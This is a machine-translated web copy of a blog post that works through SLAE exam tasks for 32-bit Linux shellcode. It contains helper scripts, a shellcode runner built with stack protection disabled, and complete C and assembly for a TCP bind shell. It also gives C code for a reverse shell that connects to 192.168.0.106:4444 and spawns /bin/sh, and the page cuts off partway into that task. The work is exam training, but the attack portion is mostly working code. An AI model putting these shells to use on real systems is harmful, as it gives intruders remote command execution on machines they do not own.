<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🐘 🚸 🎺 SLAE-Security Linux Assembly Expert Exam 🧜🏿 🚶🏼 📫</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Security Linux Assembly Expert-情報セキュリティのコンテキストにおけるLinuxシステムのIntelプロセッサーファミリーの32ビットアセンブリ言語の基礎に関するオンラインコースと試験。このコースは、侵入者、情報セキュリティエンジニア、およびアセンブラの基本を理解し、簡...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>SLAE-Security Linux Assembly Expert Exam</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/488416/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/nj/sc/fb/njscfbnkoirqggp_ns8h9upvies.png" alt="画像"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Security Linux Assembly Expert-情報セキュリティのコンテキストにおけるLinuxシステムのIntelプロセッサーファミリーの32ビットアセンブリ言語の基礎に関するオンラインコースと試験。</font><font style="vertical-align: inherit;">このコースは、侵入者、情報セキュリティエンジニア、およびアセンブラの基本を理解し、簡単なシェルコードの書き方を学びたいすべての人に役立ちます。</font><font style="vertical-align: inherit;">コースを完了すると、基本的なLinuxシステムコールの使用方法、簡単なシェルコードの記述方法、およびカーネルレベルでのオペレーティングシステムの基本原則の理解を開始します。</font><font style="vertical-align: inherit;">この記事では、この</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">コースの</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">試験に合格するために必要なタスクについて説明します</font><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
試験の条件に従って、7つのタスクを完了する必要があります。</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCPバインドシェルの書き込み</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">リバースTCPシェルの書き込み</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">egghunterテクニックを扱い、このテクニックの例を提供する</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">コードエンコーダーを書く</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GDB / ndisasm / libemuを使用してmsfvenomによって生成された3つのシェルコードを分析する</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">シェルコードとシェルストームの3つの多態変換を実行します。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">コードエンクリプターを書く</font></font></li>
</ol><a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
各タスクにはコメントを付ける必要があります。また、タスクの作業プロセスのスクリーンショットを提供することも望ましいです。</font><font style="vertical-align: inherit;">準備から始めましょう。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">トレーニング</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
自動化が私たちのすべてなので、タスクに進む前に、コースの習得と試験に合格するために使用されるスクリプトを説明する必要があります。</font><font style="vertical-align: inherit;">時間と労力の節約に役立ちます。</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nasm32.sh</font></font></b><br>
<br>
<pre><code class="bash hljs"><span class="hljs-meta">#!/bin/bash
</span>
<span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage ./nasm32 &lt;nasmMainFile&gt; (no extension)"</span>
  <span class="hljs-built_in">exit</span>
<span class="hljs-keyword">fi</span><font></font>
<font></font>
<span class="hljs-keyword">if</span> [ ! -e <span class="hljs-string">"<span class="hljs-variable">$1</span>.asm"</span> ]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Error, <span class="hljs-variable">$1</span>.asm not found."</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Note, do not enter file extensions"</span>
  <span class="hljs-built_in">exit</span>
<span class="hljs-keyword">fi</span><font></font>
<font></font>
nasm -f elf <span class="hljs-variable">$1</span>.asm -o <span class="hljs-variable">$1</span>.o<font></font>
ld -m elf_i386 -o <span class="hljs-variable">$1</span> <span class="hljs-variable">$1</span>.o</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このスクリプトは、.asmファイルをすばやくコンパイルしてリンクするために使用されます。</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">popcode.sh</font></font></b><br>
<br>
<pre><code class="bash hljs"><span class="hljs-meta">#!/bin/bash
</span>
target=<span class="hljs-variable">$1</span><font></font>
<font></font>
objdump -D -M intel <span class="hljs-string">"<span class="hljs-variable">$target</span>"</span> | grep <span class="hljs-string">'[0-9a-f]:'</span> | grep -v <span class="hljs-string">'file'</span> | cut -f2 -d: | cut -f1-7 -d<span class="hljs-string">' '</span> | tr -s <span class="hljs-string">' '</span> | tr <span class="hljs-string">'\t'</span> <span class="hljs-string">' '</span> | sed <span class="hljs-string">'s/ $//g'</span> | sed <span class="hljs-string">'s/ /\\x/g'</span> | paste -d <span class="hljs-string">''</span> -s</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このスクリプトを使用して、コードを16進形式で印刷します。各文字の前に "\ x"を印刷します。</font><font style="vertical-align: inherit;">これはシェルコードをCファイルに挿入するために必要です。</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hexopcode.sh</font></font></b><br>
<br>
<pre><code class="bash hljs"><span class="hljs-meta">#!/bin/bash
</span>
target=<span class="hljs-variable">$1</span><font></font>
<font></font>
objdump -D -M intel <span class="hljs-string">"<span class="hljs-variable">$target</span>"</span> | grep <span class="hljs-string">'[0-9a-f]:'</span> | grep -v <span class="hljs-string">'file'</span> | cut -f2 -d: | cut -f1-7 -d<span class="hljs-string">' '</span> | tr -s <span class="hljs-string">' '</span> | tr <span class="hljs-string">'\t'</span> <span class="hljs-string">' '</span> | sed <span class="hljs-string">'s/ $//g'</span> | sed <span class="hljs-string">'s/ /\\x/g'</span> | paste -d <span class="hljs-string">''</span> -s | sed -e <span class="hljs-string">'s!\\x!!g'</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ここではすべて上記のスクリプトと同じですが、「\ x」なしでコードのみが出力されます。</font><font style="vertical-align: inherit;">16進コードを次のスクリプトに渡すために必要です。</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hex2stack.py</font></font></b><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span><font></font>
<font></font>
<span class="hljs-keyword">import</span> sys<font></font>
<font></font>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
	<span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">2</span>:<font></font>
		print(<span class="hljs-string">"Enter opcode in hex"</span>)<font></font>
		sys.exit(<span class="hljs-number">0</span>)<font></font>
<font></font>
	string = sys.argv[<span class="hljs-number">1</span>]<font></font>
<font></font>
	reversed = [string[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(string),<span class="hljs-number">2</span>)][::<span class="hljs-number">-1</span>]<font></font>
<font></font>
	l = len(reversed) % <span class="hljs-number">4</span>
	<span class="hljs-keyword">if</span> l:<font></font>
		print(<span class="hljs-string">"\tpush 0x"</span> + <span class="hljs-string">"90"</span>*(<span class="hljs-number">4</span>-l) + <span class="hljs-string">""</span>.join(reversed[<span class="hljs-number">0</span>:l]))<font></font>
<font></font>
	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> range(l, len(reversed[l:]), <span class="hljs-number">4</span>):<font></font>
		print(<span class="hljs-string">"\tpush 0x"</span> + <span class="hljs-string">""</span>.join(reversed[p:p+<span class="hljs-number">4</span>]))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
コードの操作を簡単にするために、コードをスタックにプッシュできます。</font><font style="vertical-align: inherit;">データは、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">push</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">コマンドを使用して逆の順序でスタックにプッシュされます</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">上記のスクリプトは、16進文字列を変換してスタックに配置します。</font></font><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例：</font></font></i><br>
<br>
<pre><code class="plaintext hljs">$./stack_shell.py 31c0506a68682f626173682f62696e89e35089c25389e1b00bcd80<font></font>
	push 0x9080cd0b<font></font>
	push 0xb0e18953<font></font>
	push 0xc28950e3<font></font>
	push 0x896e6962<font></font>
	push 0x2f687361<font></font>
	push 0x622f6868<font></font>
	push 0x6a50c031</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uscompile.sh</font></font></b><br>
<br>
<pre><code class="bash hljs"><span class="hljs-meta">#!/bin/bash
</span>
<span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage ./compile &lt;cFile&gt; (no extension)"</span>
  <span class="hljs-built_in">exit</span>
<span class="hljs-keyword">fi</span><font></font>
<font></font>
<span class="hljs-keyword">if</span> [ ! -e <span class="hljs-string">"<span class="hljs-variable">$1</span>.c"</span> ]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Error, <span class="hljs-variable">$1</span>.c not found."</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Note, do not enter file extensions"</span>
  <span class="hljs-built_in">exit</span>
<span class="hljs-keyword">fi</span><font></font>
<font></font>
gcc -masm=intel -m32 -ggdb -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o <span class="hljs-variable">$1</span> <span class="hljs-variable">$1</span>.c</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このスクリプトは、スタック保護を無効にしたCファイルをコンパイルします。</font><font style="vertical-align: inherit;">教育目的の保護を無効にします。</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode.c</font></font></b><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span><font></font>
<font></font>
<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> code[] =
<span class="hljs-string">""</span>;<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Shellcode Length:  %d\n"</span>, <span class="hljs-built_in">strlen</span>(code));
        <span class="hljs-keyword">int</span> (*ret)() = (<span class="hljs-keyword">int</span>(*)())code;<font></font>
        ret();<font></font>
}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
シェルコードを入れるCファイル自体。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">タスク</font></font></h3><br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. TCPバインドシェルを作成する</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
最も単純なTCPバインドシェルを作成するため、この場合の順序は次のとおりです。</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">socket（）システムコールを使用してソケットを作成します;作成時に、番号であるソケット記述子が与えられます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作成されたソケットについて、パラメーター（プロトコル、「リッスン」するアドレス、ポート）を構成し、bind（）システムコールを実行します。これにより、ソケットが指定されたパラメーターに固定されます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">次に、listen（）を呼び出します-ソケットは着信接続を「リッスン」します。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接続を聞くだけでは十分ではなく、それらを受け入れる必要があるため、-accept（）;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">クライアントが接続した後、入力、出力、エラーの標準記述子をクライアントにリダイレクトする必要があります。dup2（）;を使用してそれらを複製します。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最後に、クライアントがコマンドを実行できるコマンドシェルを呼び出します。</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
アセンブリコードの作成に進む前に、上記の例をCで実装すると便利です。</font></font><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/in.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
</span>{
    <span class="hljs-keyword">int</span> clientfd, sockfd;
    <span class="hljs-keyword">int</span> port = <span class="hljs-number">1234</span>;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">mysockaddr</span>;</span><font></font>
<font></font>
    <span class="hljs-comment">// AF_INET - IPv4, SOCK_STREAM - TCP, 0 - most suitable protocol</span>
    <span class="hljs-comment">// AF_INET = 2, SOCK_STREAM = 1</span>
    <span class="hljs-comment">// create socket, save socket file descriptor in sockfd variable</span>
    sockfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<font></font>
<font></font>
    <span class="hljs-comment">// fill structure</span>
    mysockaddr.sin_family = AF_INET; <span class="hljs-comment">// can be represented in numeric as 2</span><font></font>
    mysockaddr.sin_port = htons(port);<font></font>
    <span class="hljs-comment">//mysockaddr.sin_addr.s_addr = INADDR_ANY;// can be represented in numeric as 0 which means to bind to all interfaces</span>
    mysockaddr.sin_addr.s_addr = inet_addr(<span class="hljs-string">"192.168.0.106"</span>);
    <span class="hljs-comment">// size of this array is 16 bytes</span>
    <span class="hljs-comment">//printf("size of mysockaddr: %lu\n", sizeof(mysockaddr));</span>
    <span class="hljs-comment">// executing bind() call</span>
    bind(sockfd, (struct sockaddr *) &amp;mysockaddr;, <span class="hljs-keyword">sizeof</span>(mysockaddr));
    <span class="hljs-comment">// listen()</span>
    listen(sockfd, <span class="hljs-number">1</span>);
    <span class="hljs-comment">// accept()</span>
    clientfd = accept(sockfd, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
    <span class="hljs-comment">// duplicate standard file descriptors in client file descriptor</span>
    dup2(clientfd, <span class="hljs-number">0</span>);<font></font>
    dup2(clientfd, <span class="hljs-number">1</span>);<font></font>
    dup2(clientfd, <span class="hljs-number">2</span>);
    <span class="hljs-comment">// and last: execute /bin/sh. All input and ouput of /bin/sh will translated via TCP connection</span>
    <span class="hljs-keyword">char</span> * <span class="hljs-keyword">const</span> argv[] = {<span class="hljs-string">"sh"</span>,<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>};<font></font>
    execve(<span class="hljs-string">"/bin/sh"</span>, argv, <span class="hljs-literal">NULL</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<font></font>
}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
コードをアセンブラーに移植する時間です。</font><font style="vertical-align: inherit;">各呼び出しが受け入れるだけでなく、どの引数を理解するために、それらのガイドを見ることができます：man &lt;call&gt;。</font><font style="vertical-align: inherit;">1つの名前に複数のリファレンスマニュアルがある場合があります。</font><font style="vertical-align: inherit;">利用可能なすべてのリスト：apropos &lt;call&gt;。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
その後：man &lt;対象となるマニュアルの番号&gt; &lt;call&gt;。</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.レジスター</font></font></b><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
を</font><b><font style="vertical-align: inherit;">準備し</font></b><font style="vertical-align: inherit;">ます。レジスターを使用する最初の段階では、レジスターにある値がわからないため、それらをリセットします。</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	xor eax, eax<font></font>
	xor ebx, ebx<font></font>
	xor esi, esi</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.ソケットの作成</font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
x86システムコールでは、ソケット（）への直接の呼び出しはありません。</font><font style="vertical-align: inherit;">すべての呼び出しは、socketcall（）メソッドを介して間接的に行われます。</font><font style="vertical-align: inherit;">この呼び出しは2つの引数を取ります。ソケット呼び出し番号とその引数へのポインターです。</font><font style="vertical-align: inherit;">可能なソケット呼び出しのリストは、ファイル/usr/include/linux/net.hにあります。</font></font><br>
<br>
<pre><code class="plaintext hljs">	; creating socket. 3 args<font></font>
	push esi	; 3rd arg, choose default proto<font></font>
	push 0x1	; 2nd arg, 1 equal SOCK_STREAM, TCP<font></font>
	push 0x2	; 1st arg, 2 means Internet family proto<font></font>
	; calling socket call for socket creating<font></font>
	mov al, 102	; socketcall<font></font>
	mov bl, 1	; 1 = socket()<font></font>
	mov ecx, esp	; pointer to args of socket()<font></font>
	int 0x80<font></font>
	; in eax socket file descriptor. Save it<font></font>
	mov edx, eax</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.作成したソケットのパラメーターを指定してbind（）を実行します。</font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
以下の画像は、ソケットパラメータをスタックにプッシュする方法を示しています。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ソケットパラメータがスタックにどのような形式で配置されるかを理解するために、少し時間を費やす必要がありました。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wg/zx/xb/wgzxxblapjjafqugqngl61pc_7y.png" alt="画像"><br>
<br>
<pre><code class="plaintext hljs">	; creating sockaddr_in addr struct for bind<font></font>
	push esi		; address, 0 - all interfaces<font></font>
	push WORD 0xd204	; port 1234.<font></font>
	push WORD 2		; AF_INET<font></font>
	mov ecx, esp		; pointer to sockaddr_in struct<font></font>
	push 0x16		; size of struct<font></font>
	push ecx		; pushing pointer to struct<font></font>
	push edx		; pushing socket descriptor<font></font>
	; socketcall<font></font>
	mov al, 102<font></font>
	mov bl, 2		; bind()<font></font>
	mov ecx, esp<font></font>
	int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ポートを変更するには、次のコマンドを実行します。</font></font><br>
<br>
<pre><code class="plaintext hljs">$python3 -c "import socket; print(hex(socket.htons(&lt;int:port&gt;)))"
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、ソケットがリッスンする特定のアドレスを指定したい場合：</font></font><br>
<br>
<pre><code class="plaintext hljs">$python3 -c 'import ipaddress; d = hex(int(ipaddress.IPv4Address("&lt;IPv4 address&gt;"))); print("0x"+"".join([d[i:i+2] for i in range(0,len(d),2)][1:][::-1]))'</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. listen（）を呼び出す</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; creating listen<font></font>
	push 1<font></font>
	push edx<font></font>
	; calling socketcall<font></font>
	mov al, 102<font></font>
	mov bl, 4		; listen()<font></font>
	mov ecx, esp<font></font>
	int 0x80</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. accept（）を呼び出します</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; creating accept()<font></font>
	push esi<font></font>
	push esi<font></font>
	push edx<font></font>
	; calling socketcall<font></font>
	mov al, 102<font></font>
	mov bl, 5		; accept()<font></font>
	mov ecx, esp<font></font>
	int 0x80<font></font>
<font></font>
	mov edx, eax		; saving client file descriptor</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.標準記述子を複製します。</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; dup2 STDIN, STDOUT, STDERR<font></font>
	xor ecx, ecx<font></font>
	mov cl, 3<font></font>
	mov ebx, edx<font></font>
dup:	dec ecx<font></font>
	mov al, 63<font></font>
	int 0x80<font></font>
	jns dup</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.コマンドシェルを呼び出す</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; execve /bin/sh<font></font>
	xor eax, eax<font></font>
	push eax<font></font>
	push 0x68732f2f<font></font>
	push 0x6e69622f<font></font>
        mov ebx, esp<font></font>
        push eax<font></font>
        mov edx, esp<font></font>
        push ebx<font></font>
        mov ecx, esp<font></font>
        mov al, 11<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
全部まとめて</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	; clear registers<font></font>
	xor eax, eax<font></font>
	xor ebx, ebx<font></font>
	xor esi, esi<font></font>
	; creating socket. 3 args<font></font>
	push esi	; 3rd arg, choose default proto<font></font>
	push 0x1	; 2nd arg, 1 equal SOCK_STREAM, TCP<font></font>
	push 0x2	; 1st arg, 2 means Internet family proto<font></font>
	; calling socket call for socket creating<font></font>
	mov al, 102	; socketcall<font></font>
	mov bl, 1	; 1 = socket()<font></font>
	mov ecx, esp	; pointer to args of socket()<font></font>
	int 0x80<font></font>
	; in eax socket file descriptor. Save it<font></font>
	mov edx, eax<font></font>
<font></font>
	; creating sockaddr_in addr struct for bind<font></font>
	push esi		; address, 0 - all interfaces<font></font>
	push WORD 0xd204	; port 1234.<font></font>
	push WORD 2		; AF_INET<font></font>
	mov ecx, esp		; pointer to sockaddr_in struct<font></font>
	push 0x16		; size of struct<font></font>
	push ecx		; pushing pointer to struct<font></font>
	push edx		; pushing socket descriptor<font></font>
	; socketcall<font></font>
	mov al, 102		; socketcall() number<font></font>
	mov bl, 2		; bind()<font></font>
	mov ecx, esp		; 2nd argument - pointer to args<font></font>
	int 0x80<font></font>
<font></font>
	; creating listen<font></font>
	push 1			; listen for 1 client<font></font>
	push edx		; clients queue size<font></font>
	; calling socketcall<font></font>
	mov al, 102<font></font>
	mov bl, 4		; listen()<font></font>
	mov ecx, esp<font></font>
	int 0x80<font></font>
<font></font>
	; creating accept()<font></font>
	push esi		; use default value<font></font>
	push esi		; use default value<font></font>
	push edx		; sockfd<font></font>
	; calling socketcall<font></font>
	mov al, 102<font></font>
	mov bl, 5		; accept()<font></font>
	mov ecx, esp<font></font>
	int 0x80<font></font>
<font></font>
	mov edx, eax		; saving client file descriptor<font></font>
<font></font>
	; dup2 STDIN, STDOUT, STDERR<font></font>
	xor ecx, ecx		; clear ecx<font></font>
	mov cl, 3		; number of loops<font></font>
	mov ebx, edx		; socketfd<font></font>
dup:	dec ecx<font></font>
	mov al, 63		; number of dup2 syscall()<font></font>
	int 0x80<font></font>
	jns dup			; repeat for 1,0<font></font>
<font></font>
	; execve /bin/bash<font></font>
	xor eax, eax		; clear eax<font></font>
	push eax		; string terminator<font></font>
	push 0x68732f2f		; //bin/sh<font></font>
	push 0x6e69622f<font></font>
        mov ebx, esp		; 1st arg - address of //bin/sh<font></font>
        push eax		; <font></font>
        mov edx, eax		; last argument is zero<font></font>
        push ebx		; 2nd arg - pointer to all args of command<font></font>
        mov ecx, esp		; pointer to args<font></font>
        mov al, 11		; execve syscall number<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、受信したシェルコードのオペコードを取得し、それをCファイルテンプレートに転送し、コンパイルして実行します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/px/vs/x_/pxvsx_kbwk8cpw6ut9vd0eopjt0.png" alt="画像"><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.リバースTCPシェル</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この実装におけるこのタスクは、着信接続を受け入れることを除いて、前のタスクと非常に似ています。</font><font style="vertical-align: inherit;">一般的なアルゴリズム：</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
1.ソケットを作成します。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
2.接続パラメーターを設定します。プロトコル、ホスト、ポート。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
3.ファイル記述子が重複しています。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
4.コマンドシェルを呼び出します。</font></font><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/ip.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* ip = <span class="hljs-string">"192.168.0.106"</span>;	<span class="hljs-comment">// place your address here</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">addr</span>;</span><font></font>
<font></font>
    addr.sin_family = AF_INET;<font></font>
    addr.sin_port = htons(<span class="hljs-number">4444</span>);	<span class="hljs-comment">// port</span><font></font>
    inet_aton(ip, &amp;addr;.sin_addr);<font></font>
<font></font>
    <span class="hljs-keyword">int</span> sockfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<font></font>
    connect(sockfd, (struct sockaddr *)&amp;addr;, <span class="hljs-keyword">sizeof</span>(addr));<font></font>
<font></font>
    <span class="hljs-comment">/* duplicating standard file descriptors */</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)<font></font>
    {<font></font>
        dup2(sockfd, i);<font></font>
    }<font></font>
<font></font>
    execve(<span class="hljs-string">"/bin/sh"</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<font></font>
<font></font>
 </code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
アセンブラーに翻訳</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
